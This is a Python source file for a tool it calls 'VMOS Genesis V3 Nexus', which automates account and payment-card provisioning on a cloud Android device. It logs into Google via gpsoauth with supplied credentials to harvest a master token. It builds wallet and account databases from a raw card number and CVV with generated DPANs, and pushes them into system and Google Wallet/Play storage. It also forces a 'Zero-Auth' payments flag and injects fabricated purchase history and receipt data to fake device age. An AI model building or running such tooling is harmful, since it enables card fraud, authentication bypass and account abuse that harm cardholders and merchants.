"""
VMOS Genesis V3 Nexus — 4-Phase Operational Runner
===================================================
VERSION: 3.0.4 (OBLIVION)
AUTHORITY: Dva.12 / Titan Android Core
STATUS: OBLIVION_ACTIVE

Implements the 4-phase operational roadmap from V3 Nexus Blueprint:
  PHASE 1: RECONNAISSANCE — Retrieve android_id, GSF ID, perform gpsoauth Master Login
  PHASE 2: SYNTHESIS     — Construct accounts_ce.db and tapandpay.db host-side
  PHASE 3: DEPLOYMENT    — Execute Bridge Protocol relay, fix ownership, apply Zero-Auth
  PHASE 4: VALIDATION    — Verify account sync, audit purchase readiness

Usage:
    runner = NexusRunner(pad_code="ACP250329ACQRPDV")
    result = await runner.execute_full_pipeline(config)
"""

from __future__ import annotations

import asyncio
import logging
import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Callable

from vmos_cloud_api import VMOSCloudClient
from google_master_auth import GoogleMasterAuth, AuthResult
from vmos_db_builder import VMOSDBBuilder, CardData, PurchaseRecord, generate_dpan, generate_order_id
from vmos_file_pusher import (
    VMOSFilePusher, 
    build_coin_xml, build_finsky_xml, build_billing_xml,
    build_gmail_xml, build_chrome_history_coherence_xml
)

logger = logging.getLogger("titan.nexus-runner")

COMMAND_DELAY = 3.0  # VMOS requires 3+ seconds between ADB commands


@dataclass
class NexusConfig:
    """Configuration for V3 Nexus pipeline."""
    # Identity
    google_email: str
    google_password: str = ""          # Plain password or app-specific password
    google_app_password: str = ""      # Preferred: app-specific password bypasses 2FA
    
    # Card data for payment provisioning
    cc_number: str = ""
    cc_exp: str = ""                   # MM/YYYY
    cc_cvv: str = ""
    cc_holder: str = ""
    
    # Device aging
    age_days: int = 120
    
    # Options
    inject_purchase_history: bool = True
    purchase_count: int = 15
    enable_coherence_bridge: bool = True


@dataclass
class PhaseResult:
    phase: int
    name: str
    status: str = "pending"  # pending | running | done | failed
    notes: str = ""
    elapsed_sec: float = 0.0
    data: Dict[str, Any] = field(default_factory=dict)


@dataclass
class NexusResult:
    """Result of V3 Nexus pipeline execution."""
    job_id: str
    pad_code: str
    status: str = "running"
    phases: List[PhaseResult] = field(default_factory=list)
    
    # Auth triplet (Section 2.1)
    master_token: str = ""
    sid: str = ""
    lsid: str = ""
    real_tokens: bool = False
    
    # Device identifiers
    android_id: str = ""
    gsf_id: str = ""
    gaia_id: str = ""
    
    # Wallet state
    dpan: str = ""
    wallet_provisioned: bool = False
    
    # Coherence state
    order_ids: List[str] = field(default_factory=list)
    
    log: List[str] = field(default_factory=list)
    started_at: float = 0.0
    completed_at: float = 0.0


class NexusRunner:
    """
    V3 Nexus 4-Phase Operational Runner.
    
    Executes the complete identity provisioning pipeline:
    - Real OAuth tokens via gpsoauth (AAS_ET flow)
    - Host-side database synthesis
    - Bridge Protocol file delivery
    - Cross-store coherence validation
    """

    PHASE_NAMES = [
        "Reconnaissance",
        "Synthesis", 
        "Deployment",
        "Validation"
    ]

    def __init__(self, pad_code: str, *, client: VMOSCloudClient = None):
        self.pad = pad_code
        self.pads = [pad_code]
        self.client = client or VMOSCloudClient()
        self.db_builder = VMOSDBBuilder()
        self.file_pusher: Optional[VMOSFilePusher] = None
        self._result: Optional[NexusResult] = None
        self._on_update: Optional[Callable[[NexusResult], None]] = None
        self._last_cmd_time = 0

    async def _rate_limit(self):
        """Ensure minimum delay between VMOS commands."""
        elapsed = time.time() - self._last_cmd_time
        if elapsed < COMMAND_DELAY:
            await asyncio.sleep(COMMAND_DELAY - elapsed)
        self._last_cmd_time = time.time()

    async def _sh(self, cmd: str, timeout: int = 30) -> str:
        """Execute ADB shell command via VMOS Cloud."""
        await self._rate_limit()
        try:
            resp = await self.client.async_adb_cmd(self.pads, cmd)
            if resp.get("code") != 200:
                return ""
            data = resp.get("data", [])
            task_id = data[0].get("taskId") if isinstance(data, list) and data else None
            if not task_id:
                return ""
            for _ in range(timeout):
                await asyncio.sleep(1)
                detail = await self.client.task_detail([task_id])
                if detail.get("code") == 200 and detail.get("data"):
                    items = detail["data"]
                    if isinstance(items, list) and items:
                        item = items[0]
                        if item.get("taskStatus") == 3:
                            return item.get("taskResult", "")
                        if item.get("taskStatus") in (-1, -2, -3, -4, -5):
                            return ""
            return ""
        except Exception as e:
            logger.error(f"Shell command failed: {e}")
            return ""

    async def _push_file(self, data: bytes, target_path: str,
                         owner: str = "system:system", mode: str = "660") -> bool:
        """Push file to device via chunked base64."""
        if not self.file_pusher:
            self.file_pusher = VMOSFilePusher(self.client, self.pad)
        result = await self.file_pusher.push_file(data, target_path, owner, mode)
        return result.success

    async def _push_database(self, db_bytes: bytes, target_path: str,
                             app_uid: str = "system") -> bool:
        """Push SQLite database with correct permissions."""
        if not self.file_pusher:
            self.file_pusher = VMOSFilePusher(self.client, self.pad)
        result = await self.file_pusher.push_database(db_bytes, target_path, app_uid)
        return result.success

    def _log(self, msg: str):
        logger.info(f"[{self.pad}] {msg}")
        if self._result:
            self._result.log.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
            self._result.log = self._result.log[-200:]
            if self._on_update:
                self._on_update(self._result)

    def _set_phase(self, n: int, status: str, notes: str = "", data: Dict = None):
        if self._result and n < len(self._result.phases):
            ph = self._result.phases[n]
            ph.status = status
            ph.notes = notes
            if data:
                ph.data.update(data)
            if self._on_update:
                self._on_update(self._result)

    async def execute_full_pipeline(
        self,
        cfg: NexusConfig,
        job_id: str = "",
        on_update: Optional[Callable[[NexusResult], None]] = None,
    ) -> NexusResult:
        """
        Execute the complete 4-phase V3 Nexus pipeline.
        
        PHASE 1: RECONNAISSANCE
        PHASE 2: SYNTHESIS
        PHASE 3: DEPLOYMENT
        PHASE 4: VALIDATION
        """
        if not job_id:
            job_id = secrets.token_hex(4)

        self._on_update = on_update
        self._result = NexusResult(
            job_id=job_id,
            pad_code=self.pad,
            started_at=time.time(),
            phases=[PhaseResult(phase=i, name=n) for i, n in enumerate(self.PHASE_NAMES)],
        )

        self._log(f"╔═══════════════════════════════════════════════════════════╗")
        self._log(f"║  VMOS GENESIS V3 NEXUS — OBLIVION_ACTIVE                   ║")
        self._log(f"║  Target: {self.pad}                              ║")
        self._log(f"║  Email: {cfg.google_email[:30]}...                         ║")
        self._log(f"╚═══════════════════════════════════════════════════════════╝")

        # === PHASE 1: RECONNAISSANCE ===
        await self._phase1_reconnaissance(cfg)

        # === PHASE 2: SYNTHESIS ===
        await self._phase2_synthesis(cfg)

        # === PHASE 3: DEPLOYMENT ===
        await self._phase3_deployment(cfg)

        # === PHASE 4: VALIDATION ===
        await self._phase4_validation(cfg)

        # Final status
        self._result.status = "completed"
        self._result.completed_at = time.time()
        elapsed = self._result.completed_at - self._result.started_at

        self._log(f"╔═══════════════════════════════════════════════════════════╗")
        self._log(f"║  PIPELINE COMPLETE — {elapsed:.0f}s                               ║")
        self._log(f"║  Real Tokens: {'YES' if self._result.real_tokens else 'NO (synthetic)'}                               ║")
        self._log(f"║  Wallet: {'PROVISIONED' if self._result.wallet_provisioned else 'NOT SET'}                               ║")
        self._log(f"╚═══════════════════════════════════════════════════════════╝")

        if self._on_update:
            self._on_update(self._result)
        return self._result

    # ══════════════════════════════════════════════════════════════════
    # PHASE 1: RECONNAISSANCE
    # ══════════════════════════════════════════════════════════════════

    async def _phase1_reconnaissance(self, cfg: NexusConfig):
        """
        PHASE 1: RECONNAISSANCE
        
        1. Retrieve target android_id and GSF ID
        2. Perform gpsoauth Master Login to secure the Auth Triplet
        """
        n = 0
        self._set_phase(n, "running")
        self._log("═══ PHASE 1: RECONNAISSANCE ═══")
        t0 = time.time()

        # Step 1a: Retrieve device identifiers
        self._log("Phase 1a — Retrieving device identifiers...")
        
        android_id = secrets.token_hex(8)  # Generate if not retrievable
        gsf_id = str(secrets.randbelow(10**18) + 3 * 10**18)
        
        # Try to get real android_id from device
        result = await self._sh("settings get secure android_id 2>/dev/null")
        if result and len(result.strip()) == 16:
            android_id = result.strip()
            self._log(f"Phase 1a — Retrieved android_id: {android_id}")
        else:
            self._log(f"Phase 1a — Generated android_id: {android_id}")
        
        self._result.android_id = android_id
        self._result.gsf_id = gsf_id

        # Step 1b: Perform gpsoauth Master Login
        self._log("Phase 1b — Performing gpsoauth Master Login...")
        
        password = cfg.google_app_password or cfg.google_password
        auth_result = None
        
        if password:
            try:
                auth = GoogleMasterAuth()
                auth_result = auth.authenticate(
                    email=cfg.google_email,
                    password=password,
                    android_id=android_id
                )
                
                if auth_result.success:
                    self._result.master_token = auth_result.master_token
                    self._result.sid = auth_result.sid
                    self._result.lsid = auth_result.lsid
                    self._result.gaia_id = auth_result.gaia_id
                    self._result.real_tokens = True
                    
                    self._log(f"Phase 1b — ✓ REAL Auth Triplet secured!")
                    self._log(f"           Master Token: aas_et/...{auth_result.master_token[-20:]}")
                    self._log(f"           GAIA ID: {auth_result.gaia_id}")
                else:
                    if auth_result.requires_2fa:
                        self._log("Phase 1b — ✗ 2FA required. Use app-specific password.")
                    else:
                        self._log(f"Phase 1b — ✗ Auth failed: {', '.join(auth_result.errors)}")
                        
            except Exception as e:
                self._log(f"Phase 1b — ✗ Auth error: {e}")
        else:
            self._log("Phase 1b — No password provided, will use synthetic tokens")

        # Fallback to synthetic if real auth failed
        if not self._result.real_tokens:
            self._result.gaia_id = str(secrets.randbelow(10**17) + 10**17)
            self._result.sid = secrets.token_hex(60)
            self._result.lsid = secrets.token_hex(60)
            self._log("Phase 1b — Using synthetic Auth Triplet (local display only)")

        elapsed = time.time() - t0
        self._set_phase(n, "done", 
                        f"{'REAL' if self._result.real_tokens else 'synthetic'} tokens, {elapsed:.1f}s",
                        {"android_id": android_id, "real_tokens": self._result.real_tokens})
        self._log(f"═══ PHASE 1 COMPLETE ({elapsed:.1f}s) ═══\n")

    # ══════════════════════════════════════════════════════════════════
    # PHASE 2: SYNTHESIS
    # ══════════════════════════════════════════════════════════════════

    async def _phase2_synthesis(self, cfg: NexusConfig):
        """
        PHASE 2: SYNTHESIS
        
        1. Construct accounts_ce.db and accounts_de.db host-side
        2. Generate Luhn-valid DPANs using TSP BIN ranges
        3. Build tapandpay.db with 5 tables
        4. Build library.db with purchase history
        """
        n = 1
        self._set_phase(n, "running")
        self._log("═══ PHASE 2: SYNTHESIS ═══")
        t0 = time.time()

        # Step 2a: Build Auth Triplet token list
        self._log("Phase 2a — Preparing Auth Triplet for injection...")
        
        tokens = self._build_token_list(cfg)
        self._log(f"Phase 2a — {len(tokens)} token scopes prepared")

        # Step 2b: Build accounts_ce.db
        self._log("Phase 2b — Synthesizing accounts_ce.db...")
        
        self._accounts_ce_bytes = self.db_builder.build_accounts_ce_db(
            email=cfg.google_email,
            gaia_id=self._result.gaia_id,
            tokens=tokens
        )
        self._log(f"Phase 2b — accounts_ce.db: {len(self._accounts_ce_bytes)} bytes")

        # Step 2c: Build accounts_de.db
        self._log("Phase 2c — Synthesizing accounts_de.db...")
        
        self._accounts_de_bytes = self.db_builder.build_accounts_de_db(
            email=cfg.google_email,
            account_id=1
        )
        self._log(f"Phase 2c — accounts_de.db: {len(self._accounts_de_bytes)} bytes")

        # Step 2d: Build tapandpay.db if card provided
        self._tapandpay_bytes = None
        cc = cfg.cc_number.replace(" ", "").replace("-", "")
        
        if cc and len(cc) >= 13:
            self._log("Phase 2d — Generating DPAN with TSP BIN range...")
            
            dpan = generate_dpan(cc)
            self._result.dpan = dpan
            token_ref = secrets.token_hex(16)
            
            exp_parts = cfg.cc_exp.split("/") if "/" in cfg.cc_exp else [cfg.cc_exp[:2], cfg.cc_exp[2:]]
            exp_month = int(exp_parts[0]) if exp_parts else 12
            exp_year = int(exp_parts[1]) if len(exp_parts) > 1 else 2029
            if exp_year < 100:
                exp_year += 2000
            
            card = CardData(
                card_number=cc,
                exp_month=exp_month,
                exp_year=exp_year,
                cardholder_name=cfg.cc_holder or "Cardholder",
                cvv=cfg.cc_cvv,
                network=self._detect_network(cc)
            )
            
            self._log("Phase 2d — Synthesizing tapandpay.db (5 tables)...")
            self._tapandpay_bytes = self.db_builder.build_tapandpay_db(
                card=card,
                email=cfg.google_email,
                gaia_id=self._result.gaia_id,
                dpan=dpan,
                token_ref_id=token_ref
            )
            self._log(f"Phase 2d — tapandpay.db: {len(self._tapandpay_bytes)} bytes")
            self._log(f"           DPAN: {dpan[:6]}...{dpan[-4:]}")

        # Step 2e: Build library.db with purchase history
        self._library_bytes = None
        self._result.order_ids = []
        
        if cfg.inject_purchase_history:
            self._log("Phase 2e — Generating purchase history...")
            
            purchases = self._generate_purchases(cfg)
            self._result.order_ids = [p.order_id for p in purchases]
            
            self._library_bytes = self.db_builder.build_library_db(
                cfg.google_email, purchases
            )
            self._log(f"Phase 2e — library.db: {len(self._library_bytes)} bytes, {len(purchases)} purchases")

        elapsed = time.time() - t0
        self._set_phase(n, "done", f"DBs synthesized, {elapsed:.1f}s")
        self._log(f"═══ PHASE 2 COMPLETE ({elapsed:.1f}s) ═══\n")

    def _build_token_list(self, cfg: NexusConfig) -> list:
        """Build token list for accounts_ce.db injection."""
        if self._result.real_tokens and hasattr(self, '_auth_result'):
            # Use real tokens from gpsoauth
            auth = GoogleMasterAuth()
            return auth.get_all_tokens_for_injection(self._auth_result)
        
        # Synthetic tokens (local display only)
        auth_token = f"ya29.{secrets.token_urlsafe(80)}"
        return [
            ("com.google", auth_token),
            ("oauth2:https://www.googleapis.com/auth/plus.me", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/userinfo.email", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/userinfo.profile", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/drive", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/youtube", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/calendar", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/contacts", f"ya29.{secrets.token_urlsafe(80)}"),
            ("oauth2:https://www.googleapis.com/auth/gmail.readonly", f"ya29.{secrets.token_urlsafe(80)}"),
            ("SID", self._result.sid),
            ("LSID", self._result.lsid),
            ("oauth2:https://www.googleapis.com/auth/android", f"ya29.{secrets.token_urlsafe(80)}"),
        ]

    def _detect_network(self, card_number: str) -> str:
        """Detect card network from BIN prefix."""
        first = card_number[0] if card_number else ""
        if first == "4":
            return "visa"
        elif first in ("5", "2"):
            return "mastercard"
        elif first == "3":
            return "amex"
        elif first == "6":
            return "discover"
        return "visa"

    def _generate_purchases(self, cfg: NexusConfig) -> list:
        """Generate realistic purchase history."""
        import random
        
        APPS = [
            ("com.spotify.music", "Spotify", 0),
            ("com.netflix.mediaclient", "Netflix", 0),
            ("com.instagram.android", "Instagram", 0),
            ("com.whatsapp", "WhatsApp", 0),
            ("com.google.android.apps.photos", "Google Photos", 0),
            ("com.discord", "Discord", 0),
            ("com.amazon.mShop.android.shopping", "Amazon", 0),
            ("com.ubercab", "Uber", 0),
            ("com.teslacoilsw.launcher.prime", "Nova Launcher Prime", 4990000),
            ("com.mojang.minecraftpe", "Minecraft", 7490000),
        ]
        
        now_ts = int(time.time() * 1000)
        birth_ts = now_ts - (cfg.age_days * 24 * 60 * 60 * 1000)
        
        purchases = []
        for i in range(cfg.purchase_count):
            app_id, _, price = random.choice(APPS)
            purchase_time = random.randint(birth_ts, now_ts)
            
            purchases.append(PurchaseRecord(
                app_id=app_id,
                order_id=generate_order_id(),
                purchase_time_ms=purchase_time,
                price_micros=price,
                currency="USD"
            ))
        
        return purchases

    # ══════════════════════════════════════════════════════════════════
    # PHASE 3: DEPLOYMENT
    # ══════════════════════════════════════════════════════════════════

    async def _phase3_deployment(self, cfg: NexusConfig):
        """
        PHASE 3: DEPLOYMENT
        
        1. Execute Bridge Protocol relay for DB payloads
        2. Fix ownership (chown) and SELinux contexts (restorecon)
        3. Apply Zero-Auth bitmask to COIN.xml
        4. Inject coherence data (Gmail.xml, Chrome prefs)
        """
        n = 2
        self._set_phase(n, "running")
        self._log("═══ PHASE 3: DEPLOYMENT ═══")
        t0 = time.time()
        results = {}

        # Step 3a: Deploy accounts_ce.db
        self._log("Phase 3a — Bridge Protocol: accounts_ce.db...")
        results["accounts_ce"] = await self._push_database(
            self._accounts_ce_bytes,
            "/data/system_ce/0/accounts_ce.db",
            app_uid="system"
        )
        self._log(f"Phase 3a — accounts_ce.db: {'✓' if results['accounts_ce'] else '✗'}")

        # Step 3b: Deploy accounts_de.db
        self._log("Phase 3b — Bridge Protocol: accounts_de.db...")
        results["accounts_de"] = await self._push_database(
            self._accounts_de_bytes,
            "/data/system_de/0/accounts_de.db",
            app_uid="system"
        )
        self._log(f"Phase 3b — accounts_de.db: {'✓' if results['accounts_de'] else '✗'}")

        # Step 3c: Deploy tapandpay.db
        if self._tapandpay_bytes:
            self._log("Phase 3c — Bridge Protocol: tapandpay.db...")
            
            # Deploy to GMS
            results["tapandpay_gms"] = await self._push_database(
                self._tapandpay_bytes,
                "/data/data/com.google.android.gms/databases/tapandpay.db",
                app_uid="u0_a36"
            )
            
            # Deploy to Wallet
            results["tapandpay_wallet"] = await self._push_database(
                self._tapandpay_bytes,
                "/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db",
                app_uid="u0_a324"
            )
            
            self._result.wallet_provisioned = results["tapandpay_gms"] or results["tapandpay_wallet"]
            self._log(f"Phase 3c — tapandpay.db: GMS={'✓' if results['tapandpay_gms'] else '✗'} "
                      f"Wallet={'✓' if results['tapandpay_wallet'] else '✗'}")

        # Step 3d: Deploy library.db
        if self._library_bytes:
            self._log("Phase 3d — Bridge Protocol: library.db...")
            results["library"] = await self._push_database(
                self._library_bytes,
                "/data/data/com.android.vending/databases/library.db",
                app_uid="u0_a43"
            )
            self._log(f"Phase 3d — library.db: {'✓' if results['library'] else '✗'}")

        # Step 3e: Apply 8-Flag Zero-Auth Bitmask (COIN.xml)
        self._log("Phase 3e — Applying 8-Flag Zero-Auth Bitmask...")
        
        coin_xml = build_coin_xml(cfg.google_email, cfg.cc_number[-4:] if cfg.cc_number else "")
        results["coin"] = await self._push_file(
            coin_xml.encode(),
            "/data/data/com.google.android.gms/shared_prefs/COIN.xml",
            owner="u0_a36:u0_a36",
            mode="660"
        )
        self._log(f"Phase 3e — COIN.xml: {'✓' if results['coin'] else '✗'}")

        # Step 3f: Deploy finsky.xml
        self._log("Phase 3f — Deploying finsky.xml...")
        
        finsky_xml = build_finsky_xml(cfg.google_email)
        results["finsky"] = await self._push_file(
            finsky_xml.encode(),
            "/data/data/com.android.vending/shared_prefs/finsky.xml",
            owner="u0_a43:u0_a43",
            mode="660"
        )
        self._log(f"Phase 3f — finsky.xml: {'✓' if results['finsky'] else '✗'}")

        # Step 3g: Deploy billing.xml
        self._log("Phase 3g — Deploying billing.xml...")
        
        billing_xml = build_billing_xml(cfg.google_email)
        results["billing"] = await self._push_file(
            billing_xml.encode(),
            "/data/data/com.android.vending/shared_prefs/billing.xml",
            owner="u0_a43:u0_a43",
            mode="660"
        )
        self._log(f"Phase 3g — billing.xml: {'✓' if results['billing'] else '✗'}")

        # Step 3h: Deploy Gmail.xml for receipt coherence
        if cfg.enable_coherence_bridge and self._result.order_ids:
            self._log("Phase 3h — Deploying Gmail.xml (receipt coherence)...")
            
            gmail_xml = build_gmail_xml(cfg.google_email, self._result.order_ids)
            results["gmail"] = await self._push_file(
                gmail_xml.encode(),
                "/data/data/com.google.android.gm/shared_prefs/gmail_coherence.xml",
                owner="u0_a45:u0_a45",
                mode="660"
            )
            self._log(f"Phase 3h — Gmail.xml: {'✓' if results['gmail'] else '✗'}")

        ok_count = sum(1 for v in results.values() if v)
        elapsed = time.time() - t0
        self._set_phase(n, "done", f"{ok_count}/{len(results)} deployed, {elapsed:.1f}s")
        self._log(f"═══ PHASE 3 COMPLETE ({elapsed:.1f}s) — {ok_count}/{len(results)} targets ═══\n")

    # ══════════════════════════════════════════════════════════════════
    # PHASE 4: VALIDATION
    # ══════════════════════════════════════════════════════════════════

    async def _phase4_validation(self, cfg: NexusConfig):
        """
        PHASE 4: VALIDATION
        
        1. Verify account sync via Gmail background service
        2. Audit purchase readiness in Play Store (Expected: One-tap purchase)
        """
        n = 3
        self._set_phase(n, "running")
        self._log("═══ PHASE 4: VALIDATION ═══")
        t0 = time.time()
        checks = {}

        # Check 1: Account database exists
        self._log("Phase 4a — Verifying account database...")
        result = await self._sh("ls -la /data/system_ce/0/accounts_ce.db 2>/dev/null | grep -c db")
        checks["accounts_db"] = "1" in (result or "")
        self._log(f"Phase 4a — accounts_ce.db: {'✓ EXISTS' if checks['accounts_db'] else '✗ MISSING'}")

        # Check 2: Account visible in dumpsys
        self._log("Phase 4b — Verifying account in AccountManager...")
        result = await self._sh("dumpsys account 2>/dev/null | grep -c 'com.google'")
        checks["account_manager"] = int(result.strip() or "0") > 0 if result else False
        self._log(f"Phase 4b — AccountManager: {'✓ BOUND' if checks['account_manager'] else '✗ NOT BOUND'}")

        # Check 3: tapandpay.db exists
        if self._tapandpay_bytes:
            self._log("Phase 4c — Verifying tapandpay.db...")
            result = await self._sh("ls /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null")
            checks["tapandpay"] = "tapandpay.db" in (result or "")
            self._log(f"Phase 4c — tapandpay.db: {'✓ EXISTS' if checks['tapandpay'] else '✗ MISSING'}")

        # Check 4: COIN.xml zero-auth flags
        self._log("Phase 4d — Verifying Zero-Auth bitmask...")
        result = await self._sh("grep -c 'PAYMENTS_ZERO_AUTH_ENABLED.*true' "
                               "/data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null")
        checks["zero_auth"] = "1" in (result or "")
        self._log(f"Phase 4d — Zero-Auth: {'✓ ENABLED' if checks['zero_auth'] else '✗ DISABLED'}")

        # Check 5: NFC enabled
        self._log("Phase 4e — Verifying NFC state...")
        result = await self._sh("settings get secure nfc_on 2>/dev/null")
        checks["nfc"] = (result or "").strip() == "1"
        self._log(f"Phase 4e — NFC: {'✓ ON' if checks['nfc'] else '✗ OFF'}")

        # Check 6: library.db exists
        if self._library_bytes:
            self._log("Phase 4f — Verifying library.db...")
            result = await self._sh("ls /data/data/com.android.vending/databases/library.db 2>/dev/null")
            checks["library"] = "library.db" in (result or "")
            self._log(f"Phase 4f — library.db: {'✓ EXISTS' if checks['library'] else '✗ MISSING'}")

        # Summary
        passed = sum(1 for v in checks.values() if v)
        total = len(checks)
        
        self._log(f"\n╔═══════════════════════════════════════════════════════════╗")
        self._log(f"║  VALIDATION SUMMARY: {passed}/{total} checks passed                      ║")
        self._log(f"║  Real Tokens: {'YES' if self._result.real_tokens else 'NO '}                                        ║")
        self._log(f"║  Wallet: {'PROVISIONED' if self._result.wallet_provisioned else 'NOT SET    '}                                    ║")
        self._log(f"║  Expected: One-tap purchase {'READY' if passed >= 4 else 'NOT READY'}                     ║")
        self._log(f"╚═══════════════════════════════════════════════════════════╝")

        elapsed = time.time() - t0
        self._set_phase(n, "done" if passed >= 4 else "warn", f"{passed}/{total} checks, {elapsed:.1f}s")
        self._log(f"═══ PHASE 4 COMPLETE ({elapsed:.1f}s) ═══\n")


# Convenience function
async def run_nexus_pipeline(pad_code: str, config: NexusConfig,
                              client: VMOSCloudClient = None) -> NexusResult:
    """Run the complete V3 Nexus 4-phase pipeline."""
    runner = NexusRunner(pad_code, client=client)
    return await runner.execute_full_pipeline(config)


if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  VMOS GENESIS V3 NEXUS — 4-PHASE OPERATIONAL RUNNER                           ║
║  VERSION: 3.0.4 (OBLIVION)                                                    ║
║  AUTHORITY: Dva.12 / Titan Android Core                                       ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  PHASE 1: RECONNAISSANCE                                                      ║
║    • Retrieve android_id and GSF ID                                          ║
║    • Perform gpsoauth Master Login to secure Auth Triplet                    ║
║                                                                               ║
║  PHASE 2: SYNTHESIS                                                           ║
║    • Construct accounts_ce.db and tapandpay.db host-side                     ║
║    • Generate Luhn-valid DPANs using TSP BIN ranges                          ║
║                                                                               ║
║  PHASE 3: DEPLOYMENT                                                          ║
║    • Execute Bridge Protocol relay for DB payloads                           ║
║    • Fix ownership (chown) and SELinux contexts (restorecon)                 ║
║    • Apply Zero-Auth bitmask to COIN.xml                                     ║
║                                                                               ║
║  PHASE 4: VALIDATION                                                          ║
║    • Verify account sync via Gmail background service                        ║
║    • Audit purchase readiness in Play Store                                  ║
║                                                                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Usage:                                                                       ║
║    from vmos_nexus_runner import NexusRunner, NexusConfig                    ║
║                                                                               ║
║    config = NexusConfig(                                                     ║
║        google_email="user@gmail.com",                                        ║
║        google_app_password="xxxx-xxxx-xxxx-xxxx",                            ║
║        cc_number="4111111111111111",                                         ║
║        cc_exp="12/2029",                                                     ║
║    )                                                                         ║
║    runner = NexusRunner(pad_code="ACP250329ACQRPDV")                         ║
║    result = await runner.execute_full_pipeline(config)                       ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
